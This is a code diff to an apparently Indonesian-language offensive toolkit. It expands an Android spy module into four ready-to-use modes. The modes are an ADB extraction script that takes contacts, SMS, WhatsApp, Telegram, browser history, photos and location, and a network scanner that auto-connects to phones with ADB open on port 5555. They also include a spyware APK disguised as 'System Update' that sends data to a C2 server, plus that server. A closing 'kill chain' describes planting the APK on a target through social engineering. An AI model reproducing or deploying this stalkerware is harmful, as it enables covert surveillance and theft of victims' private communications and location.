@@ -757,87 +757,610 @@ with socketserver.TCPServer(("", PORT), Handler) as h:
 """)
 
 # ═══════════════════════════════════════════════════════
-#  SPECTRE — Android Spy Guide + ADB Tools
+#  SPECTRE — Android Spy (Full 4-Mode)
 # ═══════════════════════════════════════════════════════
 
 def module_spectre(lhost, lport):
-    section("SPECTRE — Android Spy (Siap Pakai)")
+    section("SPECTRE — Android Spy v2 (4 Mode)")
+    info(f"C2: {lhost}:{lport}")
 
-    # ADB spy script
-    adb_spy = f"""#!/usr/bin/env python3
-# SPECTRE ADB Spy — kalau ada akses ADB ke HP target
-# Butuh: adb terinstall + HP target debugging on
-import subprocess, os, time
+    # ── Mode A: ADB USB Full Extraction ──────────────────
+    adb_usb = f'''#!/usr/bin/env python3
+# SPECTRE-A: ADB USB Full Extraction
+# Butuh: adb di PATH + USB Debugging ON
+import subprocess, os, json, time
+from datetime import datetime
 
-def adb(cmd):
-    result = subprocess.run(f"adb {{cmd}}", shell=True,
-             capture_output=True, text=True)
-    return result.stdout + result.stderr
+LOOT = "spectre_loot"
+os.makedirs(LOOT, exist_ok=True)
 
-def pull_data(src, dst):
-    os.makedirs(dst, exist_ok=True)
-    print(adb(f"pull {{src}} {{dst}}"))
+def adb(*args):
+    r = subprocess.run(["adb"] + list(args), capture_output=True, text=True, timeout=30)
+    return (r.stdout + r.stderr).strip()
 
-print("[SPECTRE] Connecting via ADB...")
-print(adb("devices"))
+def pull(src, dst=None):
+    dst = dst or os.path.join(LOOT, os.path.basename(src))
+    adb("pull", src, dst)
+    return dst
+
+def shell(cmd): return adb("shell", cmd)
+
+def log(msg, data=""):
+    line = f"[{{datetime.now():%H:%M:%S}}] {{msg}}"
+    print(line)
+    if data: print(f"  {{data[:200]}}")
+
+log("Connecting...")
+devs = adb("devices")
+log("Devices", devs)
+if "device" not in devs:
+    print("[!] No device. USB debugging on?"); exit(1)
+
+# Device info
+info_data = {{
+    "model":    shell("getprop ro.product.model"),
+    "android":  shell("getprop ro.build.version.release"),
+    "serial":   shell("getprop ro.serialno"),
+    "imei":     shell("service call iphonesubinfo 1 | grep -o '[0-9]\\\\+' | tr -d '\\\\n'"),
+    "phone":    shell("service call iphonesubinfo 15 | grep -o '[0-9-+]\\\\+' | tr -d '\\\\n'"),
+    "accounts": shell("dumpsys account | grep name= | head -20"),
+    "sim":      shell("getprop gsm.sim.operator.alpha"),
+    "battery":  shell("dumpsys battery | grep level"),
+    "wifi_ip":  shell("ip route get 1 | awk '{{print $NF}}'"),
+}}
+with open(f"{{LOOT}}/device_info.json","w") as f: json.dump(info_data, f, indent=2)
+log("Device info saved", str(info_data))
 
 # Screenshot
-print("\\n[*] Screenshot...")
-adb("shell screencap -p /sdcard/scr.png")
-pull_data("/sdcard/scr.png", "spectre_loot")
-
-# Kontak
-print("[*] Contacts DB...")
-pull_data("/data/data/com.android.providers.contacts/databases/contacts2.db", "spectre_loot")
-
-# SMS
-print("[*] SMS DB...")
-pull_data("/data/data/com.android.providers.telephony/databases/mmssms.db", "spectre_loot")
-
-# WhatsApp
-print("[*] WhatsApp DB...")
-pull_data("/sdcard/WhatsApp/Databases/", "spectre_loot/whatsapp")
-
-# Call log
-print("[*] Call log...")
-out = adb("shell content query --uri content://call_log/calls --projection number:date:duration:type")
-with open("spectre_loot/calllog.txt", "w") as f: f.write(out)
+log("Screenshot...")
+shell("screencap -p /sdcard/.xc_sc.png")
+pull("/sdcard/.xc_sc.png", f"{{LOOT}}/screenshot.png")
+shell("rm /sdcard/.xc_sc.png")
 
 # GPS
-print("[*] Last location...")
-out = adb("shell dumpsys location | grep 'last known'")
-print(out)
+log("GPS location...")
+gps = shell("dumpsys location | grep -A2 'last known'")
+with open(f"{{LOOT}}/gps.txt","w") as f: f.write(gps)
+log("GPS", gps)
+
+# Contacts DB
+log("Contacts...")
+pull("/data/data/com.android.providers.contacts/databases/contacts2.db", f"{{LOOT}}/contacts2.db")
+
+# SMS DB
+log("SMS...")
+pull("/data/data/com.android.providers.telephony/databases/mmssms.db", f"{{LOOT}}/mmssms.db")
+
+# Call log (readable)
+log("Call log...")
+calls = shell("content query --uri content://call_log/calls --projection number:duration:type:date | head -100")
+with open(f"{{LOOT}}/calllog.txt","w") as f: f.write(calls)
+
+# WhatsApp
+log("WhatsApp backup DBs...")
+os.makedirs(f"{{LOOT}}/whatsapp", exist_ok=True)
+adb("pull", "/sdcard/WhatsApp/Databases/", f"{{LOOT}}/whatsapp/")
+
+# Photos (recent 20)
+log("Recent photos...")
+os.makedirs(f"{{LOOT}}/photos", exist_ok=True)
+photos = shell("find /sdcard/DCIM -name '*.jpg' | sort -r | head -20").splitlines()
+for p in photos:
+    if p.strip(): adb("pull", p.strip(), f"{{LOOT}}/photos/")
 
 # Installed apps
-print("[*] App list...")
-out = adb("shell pm list packages -3")
-with open("spectre_loot/apps.txt", "w") as f: f.write(out)
+log("Apps list...")
+apps = shell("pm list packages -3")
+with open(f"{{LOOT}}/apps.txt","w") as f: f.write(apps)
 
-print("\\n[SPECTRE] Done! Loot: spectre_loot/")
-"""
-    save_tool("spectre_adb.py", adb_spy)
+# Clipboard
+log("Clipboard...")
+clip = shell("am broadcast -a clipper.GET --ez get true 2>/dev/null || dumpsys clipboard 2>/dev/null | head -20")
+with open(f"{{LOOT}}/clipboard.txt","w") as f: f.write(clip)
+
+# Browser history (Chrome)
+log("Chrome history...")
+pull("/data/data/com.android.chrome/app_chrome/Default/History", f"{{LOOT}}/chrome_history.db")
+
+# Telegram
+log("Telegram DB...")
+pull("/data/data/org.telegram.messenger/files/", f"{{LOOT}}/telegram/")
+
+print(f"\\n[SPECTRE-A] Done! Loot dir: {{LOOT}}/")
+for f in os.listdir(LOOT):
+    size = os.path.getsize(os.path.join(LOOT,f)) if os.path.isfile(os.path.join(LOOT,f)) else 0
+    print(f"  {{f}} ({{size}} bytes)" if size else f"  {{f}}/")
+'''
+
+    # ── Mode B: ADB Network Scanner ──────────────────────
+    adb_net = f'''#!/usr/bin/env python3
+# SPECTRE-B: ADB Network Scanner — cari HP dengan TCP ADB aktif
+# Port 5555 = ADB over WiFi/network
+# Butuh: adb di PATH
+import subprocess, socket, threading, ipaddress, os, sys
+from datetime import datetime
+
+LOOT = "spectre_loot"
+os.makedirs(LOOT, exist_ok=True)
+
+found = []
+lock  = threading.Lock()
+
+def adb(device, *args):
+    r = subprocess.run(["adb", "-s", device] + list(args),
+                       capture_output=True, text=True, timeout=10)
+    return (r.stdout + r.stderr).strip()
+
+def check_host(ip, port=5555):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.8)
+        if s.connect_ex((ip, port)) == 0:
+            with lock: found.append(f"{{ip}}:{{port}}")
+            print(f"  \\033[92m[FOUND] {{ip}}:{{port}}\\033[0m")
+        s.close()
+    except: pass
+
+def get_local_subnet():
+    import socket as sock
+    try:
+        s = sock.socket(sock.AF_INET, sock.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]; s.close()
+        return str(ipaddress.IPv4Network(ip + "/24", strict=False))
+    except: return "192.168.1.0/24"
+
+subnet = sys.argv[1] if len(sys.argv)>1 else get_local_subnet()
+print(f"[SPECTRE-B] Scanning {{subnet}} for ADB TCP (port 5555)...")
+
+threads = []
+for ip in ipaddress.IPv4Network(subnet, strict=False).hosts():
+    t = threading.Thread(target=check_host, args=(str(ip),), daemon=True)
+    t.start(); threads.append(t)
+for t in threads: t.join(timeout=2)
+
+if not found:
+    print("\\n[!] No ADB TCP devices found.")
+    print("    Pastikan target Android: Developer Options → ADB over WiFi ON")
+    exit(0)
+
+print(f"\\n[+] {{len(found)}} device(s) found:")
+for i, dev in enumerate(found):
+    print(f"  [{{i}}] {{dev}}")
+
+# Connect + auto-extract
+for dev in found:
+    print(f"\\n[*] Connecting: {{dev}}")
+    r = subprocess.run(["adb", "connect", dev], capture_output=True, text=True)
+    print(f"  {{r.stdout.strip()}}")
+    if "connected" in r.stdout or "already" in r.stdout:
+        print(f"  [+] Connected! Grabbing data...")
+        # Quick grab
+        model   = adb(dev, "shell", "getprop ro.product.model")
+        android = adb(dev, "shell", "getprop ro.build.version.release")
+        user    = adb(dev, "shell", "whoami")
+        gps     = adb(dev, "shell", "dumpsys location | grep -A2 'last known'")
+        apps    = adb(dev, "shell", "pm list packages -3 | wc -l")
+        print(f"  Model   : {{model}}")
+        print(f"  Android : {{android}}")
+        print(f"  User    : {{user}}")
+        print(f"  GPS     : {{gps[:100]}}")
+        print(f"  Apps    : {{apps}} third-party installed")
+
+        safe_ip = dev.replace(":","_")
+        loot_dev = f"{{LOOT}}/{{safe_ip}}"
+        os.makedirs(loot_dev, exist_ok=True)
+
+        # Screenshot
+        adb(dev, "shell", "screencap -p /sdcard/.sp.png")
+        adb(dev, "pull", "/sdcard/.sp.png", f"{{loot_dev}}/screenshot.png")
+        adb(dev, "shell", "rm /sdcard/.sp.png")
+
+        # Contacts + SMS
+        adb(dev, "pull",
+            "/data/data/com.android.providers.contacts/databases/contacts2.db",
+            f"{{loot_dev}}/contacts2.db")
+        adb(dev, "pull",
+            "/data/data/com.android.providers.telephony/databases/mmssms.db",
+            f"{{loot_dev}}/mmssms.db")
+
+        # Call log
+        calls = adb(dev, "shell", "content query --uri content://call_log/calls --projection number:duration:type:date | head -50")
+        with open(f"{{loot_dev}}/calllog.txt","w") as f: f.write(calls)
+
+        print(f"  [+] Loot saved: {{loot_dev}}/")
+
+print(f"\\n[SPECTRE-B] Done!")
+'''
+
+    # ── Mode C: Python APK Spyware (Buildozer) ──────────
+    apk_main = f'''# SPECTRE-C: Python Android Spyware
+# Build dengan Buildozer → .apk siap deploy
+# pip install buildozer cython
+# buildozer -v android debug
+
+from kivy.app import App
+from kivy.uix.label import Label
+from kivy.clock import Clock
+import threading, socket, json, os, time, base64
+
+C2_HOST = "{lhost}"
+C2_PORT = {lport + 1}
+
+class SpectreService:
+    def __init__(self):
+        self.sock  = None
+        self.running = False
+
+    def connect(self):
+        while True:
+            try:
+                self.sock = socket.socket()
+                self.sock.connect((C2_HOST, C2_PORT))
+                self.running = True
+                self.beacon()
+                self.loop()
+            except:
+                time.sleep(15)
+
+    def send(self, data):
+        try:
+            self.sock.sendall((json.dumps(data) + "\\n").encode())
+        except: pass
+
+    def beacon(self):
+        from android import mActivity
+        ctx = mActivity.getApplicationContext()
+        info = {{
+            "type":    "beacon",
+            "model":   android.os.Build.MODEL,
+            "android": str(android.os.Build.VERSION.RELEASE),
+            "pkg":     str(ctx.getPackageName()),
+        }}
+        try:
+            import jnius
+            tm = jnius.autoclass("android.telephony.TelephonyManager")
+            mgr = mActivity.getSystemService("phone")
+            info["imei"]  = mgr.getDeviceId() or ""
+            info["phone"] = mgr.getLine1Number() or ""
+        except: pass
+        self.send(info)
+
+    def get_location(self):
+        try:
+            from plyer import gps
+            gps.configure(on_location=self._on_loc)
+            gps.start(minTime=0, minDistance=0)
+            time.sleep(3)
+        except: pass
+
+    def _on_loc(self, **kwargs):
+        self.send({{
+            "type": "gps",
+            "lat":  kwargs.get("lat"),
+            "lon":  kwargs.get("lon"),
+            "alt":  kwargs.get("altitude"),
+        }})
+
+    def get_contacts(self):
+        try:
+            import jnius
+            ctx = jnius.autoclass("org.kivy.android.PythonActivity").mActivity
+            cr  = ctx.getContentResolver()
+            cur = cr.query(
+                jnius.autoclass("android.provider.ContactsContract$CommonDataKinds$Phone").CONTENT_URI,
+                None, None, None, None)
+            contacts = []
+            while cur.moveToNext():
+                name = cur.getString(cur.getColumnIndex("display_name")) or ""
+                num  = cur.getString(cur.getColumnIndex("data1")) or ""
+                contacts.append({{"name": name, "num": num}})
+            cur.close()
+            self.send({{"type":"contacts","data":contacts[:200]}})
+        except Exception as e:
+            self.send({{"type":"contacts","err":str(e)}})
+
+    def get_sms(self):
+        try:
+            import jnius
+            ctx = jnius.autoclass("org.kivy.android.PythonActivity").mActivity
+            cr  = ctx.getContentResolver()
+            cur = cr.query(
+                jnius.autoclass("android.net.Uri").parse("content://sms/inbox"),
+                None, None, None, "date DESC LIMIT 100")
+            sms = []
+            while cur.moveToNext():
+                sms.append({{
+                    "from":    cur.getString(cur.getColumnIndex("address")) or "",
+                    "body":    cur.getString(cur.getColumnIndex("body")) or "",
+                    "date":    cur.getLong(cur.getColumnIndex("date")),
+                }})
+            cur.close()
+            self.send({{"type":"sms","data":sms}})
+        except Exception as e:
+            self.send({{"type":"sms","err":str(e)}})
+
+    def take_photo(self, camera=0):
+        try:
+            from plyer import camera as cam
+            path = "/sdcard/.xc_cam.jpg"
+            cam.take_picture(filename=path, on_complete=lambda fn: self._send_file("photo", fn))
+        except Exception as e:
+            self.send({{"type":"photo","err":str(e)}})
+
+    def _send_file(self, ftype, path):
+        try:
+            with open(path,"rb") as f:
+                data = base64.b64encode(f.read()).decode()
+            self.send({{"type":ftype,"data":data,"path":path}})
+            os.remove(path)
+        except: pass
+
+    def loop(self):
+        while self.running:
+            try:
+                buf = b""
+                while not buf.endswith(b"\\n"):
+                    chunk = self.sock.recv(4096)
+                    if not chunk: raise ConnectionError
+                    buf += chunk
+                cmd = json.loads(buf.strip())
+                t = cmd.get("cmd","")
+                if   t == "location":  threading.Thread(target=self.get_location, daemon=True).start()
+                elif t == "contacts":  threading.Thread(target=self.get_contacts, daemon=True).start()
+                elif t == "sms":       threading.Thread(target=self.get_sms, daemon=True).start()
+                elif t == "photo":     threading.Thread(target=self.take_photo, daemon=True).start()
+                elif t == "ping":      self.send({{"type":"pong"}})
+            except: break
+        self.running = False
+
+class SpectreApp(App):
+    def build(self):
+        # Jalankan spy service di background thread
+        svc = SpectreService()
+        threading.Thread(target=svc.connect, daemon=True).start()
+        # UI palsu biar keliatan normal
+        return Label(text="System Update\\nPlease wait...", color=(0.2,0.2,0.2,1))
+
+    def on_pause(self): return True
+    def on_resume(self): pass
+
+if __name__ == "__main__":
+    SpectreApp().run()
+'''
+
+    buildozer_spec = f'''[app]
+title           = System Update
+package.name    = systemupdate
+package.domain  = com.android.system
+source.dir      = .
+source.include_exts = py,kv
+version         = 1.0
+requirements    = python3,kivy,plyer,requests
+android.permissions = INTERNET,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CONTACTS,READ_SMS,CAMERA,READ_CALL_LOG,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE
+android.api     = 33
+android.minapi  = 24
+android.ndk     = 25b
+android.arch    = arm64-v8a
+android.allow_backup = False
+orientation     = portrait
+fullscreen      = 0
+
+[buildozer]
+log_level = 1
+warn_on_root = 1
+'''
+
+    # ── Mode D: SPECTRE C2 Server ──────────────────────
+    c2_server = f'''#!/usr/bin/env python3
+# SPECTRE C2 — receiver untuk Android spyware
+# python3 spy_output/spectre_c2.py
+import socket, threading, json, os, base64, sys
+from datetime import datetime
+
+HOST = "0.0.0.0"
+PORT = {lport + 1}
+LOOT = "spectre_loot"
+os.makedirs(LOOT, exist_ok=True)
+
+R="\033[91m"; G="\033[92m"; Y="\033[93m"; C="\033[96m"; M="\033[95m"; RST="\033[0m"; D="\033[90m"
+
+agents = {{}}
+lock   = threading.Lock()
+
+def log(msg, color=C): print(f"  {{color}}{{msg}}{{RST}}")
+
+def save_loot(aid, fname, data_b64):
+    d = os.path.join(LOOT, aid.replace(":","_"))
+    os.makedirs(d, exist_ok=True)
+    path = os.path.join(d, fname)
+    with open(path,"wb") as f:
+        f.write(base64.b64decode(data_b64))
+    log(f"[SAVED] {{path}}", Y)
+    return path
+
+def handle(conn, addr):
+    aid = f"{{addr[0]}}:{{addr[1]}}"
+    buf = b""
+    log(f"[CONN] {{aid}}", G)
+    try:
+        while True:
+            chunk = conn.recv(65535)
+            if not chunk: break
+            buf += chunk
+            while b"\\n" in buf:
+                line, buf = buf.split(b"\\n", 1)
+                if not line.strip(): continue
+                try:
+                    pkt = json.loads(line.strip())
+                except: continue
+                t = pkt.get("type","")
+
+                if t == "beacon":
+                    with lock: agents[aid] = {{"sock":conn,"info":pkt,"addr":addr}}
+                    log(f"[BEACON] {{aid}}", M)
+                    log(f"  Model: {{pkt.get('model','?')}} | Android: {{pkt.get('android','?')}}", D)
+                    log(f"  IMEI: {{pkt.get('imei','?')}} | Phone: {{pkt.get('phone','?')}}", D)
+
+                elif t == "gps":
+                    lat, lon = pkt.get("lat"), pkt.get("lon")
+                    log(f"[GPS] {{aid}} → lat={{lat}} lon={{lon}}", Y)
+                    log(f"  Maps: https://maps.google.com/?q={{lat}},{{lon}}", C)
+                    d = os.path.join(LOOT, aid.replace(":","_"))
+                    os.makedirs(d, exist_ok=True)
+                    with open(os.path.join(d,"gps.txt"),"a") as f:
+                        f.write(f"{{datetime.now()}} lat={{lat}} lon={{lon}}\\n")
+
+                elif t == "contacts":
+                    contacts = pkt.get("data",[])
+                    log(f"[CONTACTS] {{aid}} → {{len(contacts)}} entries", Y)
+                    d = os.path.join(LOOT, aid.replace(":","_"))
+                    os.makedirs(d, exist_ok=True)
+                    with open(os.path.join(d,"contacts.json"),"w") as f:
+                        json.dump(contacts, f, indent=2, ensure_ascii=False)
+                    for c in contacts[:5]:
+                        log(f"  {{c.get('name','?')}} — {{c.get('num','?')}}", D)
+
+                elif t == "sms":
+                    msgs = pkt.get("data",[])
+                    log(f"[SMS] {{aid}} → {{len(msgs)}} messages", Y)
+                    d = os.path.join(LOOT, aid.replace(":","_"))
+                    os.makedirs(d, exist_ok=True)
+                    with open(os.path.join(d,"sms.json"),"w") as f:
+                        json.dump(msgs, f, indent=2, ensure_ascii=False)
+                    for m in msgs[:3]:
+                        log(f"  FROM: {{m.get('from','?')}}  {{m.get('body','')[:60]}}", D)
+
+                elif t == "photo":
+                    ts = datetime.now().strftime("%H%M%S")
+                    save_loot(aid, f"photo_{{ts}}.jpg", pkt.get("data",""))
+
+                elif t == "pong":
+                    log(f"[PONG] {{aid}}", D)
+
+    except Exception as e:
+        pass
+    finally:
+        with lock: agents.pop(aid, None)
+        conn.close()
+        log(f"[DISC] {{aid}}", R)
+
+def send_cmd(aid, cmd_dict):
+    a = agents.get(aid)
+    if not a: log(f"Agent {{aid}} not found", R); return
+    try:
+        a["sock"].sendall((json.dumps(cmd_dict)+"\\n").encode())
+    except Exception as e:
+        log(f"Send error: {{e}}", R)
+
+def menu():
+    print(f"\\n{{M}}[SPECTRE C2]{{RST}} {{HOST}}:{{PORT}}")
+    while True:
+        try:
+            c = input(f"\\n{{M}}SPECTRE{{RST}} » ").strip()
+            if not c: continue
+
+            if c == "list":
+                if not agents: log("No agents", R); continue
+                for i,(k,v) in enumerate(agents.items()):
+                    inf = v.get("info",{{}})
+                    log(f"[{{i}}] {{k}} | {{inf.get('model','?')}} Android {{inf.get('android','?')}}", G)
+
+            elif c.startswith("use "):
+                idx = int(c[4:])
+                aid = list(agents.keys())[idx]
+                log(f"[SESSION] {{aid}} — type 'help' for commands", Y)
+                while True:
+                    try:
+                        inp = input(f"{{R}}{{aid}}{{RST}} $ ").strip()
+                        if inp == "back": break
+                        elif inp == "help":
+                            print(f"""
+  location  → request GPS coords
+  contacts  → dump all contacts
+  sms       → dump SMS inbox
+  photo     → take front camera photo
+  ping      → check alive""")
+                        elif inp in ("location","contacts","sms","photo","ping"):
+                            send_cmd(aid, {{"cmd": inp}})
+                            log(f"Sent: {{inp}}", C)
+                        else:
+                            log("Unknown. Type 'help'", R)
+                    except KeyboardInterrupt: break
+
+            elif c in ("exit","quit"): sys.exit(0)
+            elif c == "loot":
+                for d in os.listdir(LOOT):
+                    full = os.path.join(LOOT,d)
+                    if os.path.isdir(full):
+                        files = os.listdir(full)
+                        log(f"  {{d}}/ — {{len(files)}} files", Y)
+            else:
+                log("Commands: list · use <n> · loot · exit", D)
+
+        except (KeyboardInterrupt, EOFError):
+            print(); break
+
+srv = socket.socket()
+srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+srv.bind((HOST, PORT))
+srv.listen(20)
+print(f"{{G}}[SPECTRE C2]{{RST}} Listening {{HOST}}:{{PORT}}")
+threading.Thread(target=lambda: [handle(*srv.accept()) for _ in iter(int,1)], daemon=True).start()
+menu()
+'''
+
+    # Save semua file
+    save_tool("spectre_adb_usb.py",   adb_usb)
+    save_tool("spectre_adb_net.py",   adb_net)
+    save_tool("spectre_c2.py",        c2_server)
+
+    # APK source di subfolder
+    apk_dir = os.path.join(OUT_DIR, "spectre_apk")
+    os.makedirs(apk_dir, exist_ok=True)
+    for fname, code in [("main.py", apk_main), ("buildozer.spec", buildozer_spec)]:
+        path = os.path.join(apk_dir, fname)
+        with open(path, "w") as f: f.write(code)
+        saved(path)
 
     print(f"""
-  {C}2 mode SPECTRE:{RST}
+  {M}{'─'*52}{RST}
+  {Y}SPECTRE v2 — 4 Mode:{RST}
+  {M}{'─'*52}{RST}
 
-  {Y}Mode A — ADB (physical access / USB):{RST}
-  {G}python3 spy_output/spectre_adb.py{RST}
-  {W}Butuh: USB debugging ON di HP target{RST}
-  {W}Colok HP → langsung grab kontak/SMS/WA/GPS/screenshot{RST}
+  {C}[A] ADB USB — physical access (USB debug ON):{RST}
+  {G}python3 spy_output/spectre_adb_usb.py{RST}
+  {W}→ grab kontak, SMS, WA, foto, GPS, chrome, telegram{RST}
+  {W}→ loot tersimpan di: spectre_loot/{RST}
 
-  {Y}Mode B — APK Trojan (Metasploit):{RST}
-  {G}msfvenom -p android/meterpreter/reverse_tcp \\
-    LHOST={lhost} LPORT={lport} \\
-    -o spy_output/app_update.apk{RST}
+  {C}[B] ADB Network — scan WiFi target, no USB:{RST}
+  {G}python3 spy_output/spectre_adb_net.py [subnet]{RST}
+  {G}python3 spy_output/spectre_adb_net.py 192.168.1.0/24{RST}
+  {W}→ scan port 5555, auto-connect, auto-grab{RST}
+  {W}→ butuh: target aktifin ADB over WiFi di Dev Options{RST}
 
-  {G}msfconsole -q -x "use exploit/multi/handler; \\
-    set payload android/meterpreter/reverse_tcp; \\
-    set LHOST {lhost}; set LPORT {lport}; exploit -j"{RST}
+  {C}[C] APK Spyware — custom Python APK:{RST}
+  {G}cd spy_output/spectre_apk/{RST}
+  {G}pip install buildozer cython{RST}
+  {G}buildozer -v android debug{RST}
+  {W}→ generates bin/*.apk — install ke target{RST}
+  {W}→ tampil sebagai "System Update" (UI palsu){RST}
+  {W}→ permission: GPS, kontak, SMS, kamera, call log{RST}
+  {W}→ connect balik ke SPECTRE C2{RST}
 
-  {C}Post-exploit Android (Meterpreter):{RST}
-  {W}dump_contacts / dump_sms / dump_calllog{RST}
-  {W}geolocate / webcam_snap / record_mic -d 30{RST}
-  {W}download /sdcard/WhatsApp/Databases/{RST}
+  {C}[D] SPECTRE C2 — receiver data dari APK:{RST}
+  {G}python3 spy_output/spectre_c2.py{RST}
+  {W}→ port {lport + 1} (APK → C2){RST}
+  {W}→ command: location · contacts · sms · photo · ping{RST}
+  {W}→ semua loot auto-save di spectre_loot/<ip>/{RST}
+
+  {M}{'─'*52}{RST}
+  {Y}Kill Chain (no USB):{RST}
+  {G}1. python3 spy_output/spectre_c2.py          ← C2 up{RST}
+  {G}2. buildozer android debug                    ← build APK{RST}
+  {G}3. Install APK ke target (social eng / ADB)  ← deploy{RST}
+  {G}4. SPECTRE C2: list → use 0 → location/sms  ← control{RST}
+  {M}{'─'*52}{RST}
 """)
 
 # ═══════════════════════════════════════════════════════
